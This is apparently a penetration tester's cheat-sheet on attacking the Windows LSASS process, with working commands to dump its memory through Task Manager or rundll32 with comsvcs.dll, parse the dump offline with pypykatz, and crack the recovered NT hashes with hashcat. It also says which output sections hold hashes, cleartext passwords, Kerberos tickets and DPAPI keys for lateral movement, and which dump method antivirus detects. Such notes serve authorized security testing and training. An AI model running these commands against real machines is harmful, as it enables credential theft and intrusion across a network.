# Attacking LSASS

## Dump

GUI session — Task Manager → Processes → right-click `lsass.exe` → Create dump file → `%temp%\lsass.DMP`

No GUI — get PID first, then rundll32 (flagged by most AV):

```cmd
tasklist /svc | findstr lsass
```

```powershell
Get-Process lsass
```

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

Transfer the .dmp to attack host, same SMB method as SAM.

## Parse

Parse offline on Linux with pypykatz:

```bash
pypykatz lsa minidump <DUMPFILE>.dmp
```

What to pull from output: `== MSV ==` → NT hash (PTH or crack mode 1000). `== WDIGEST ==` → cleartext if target is pre-Win8/Server 2012 or WDIGEST re-enabled. `== Kerberos ==` → tickets/ekeys for domain lateral movement. `== DPAPI ==` → masterkeys for Chrome/Outlook/RDP cred decryption.

Crack NT hash:

```bash
hashcat -m 1000 <NT_HASH> <WORDLIST>
```

> [!warning] `rundll32 + comsvcs.dll MiniDump` is flagged by modern AV as malicious — will be blocked on hardened hosts. Task Manager method is quieter but needs GUI.

> [!tip] WDIGEST `password: None` = disabled (modern Windows default). If you see an actual password string there, it's cleartext — take it immediately.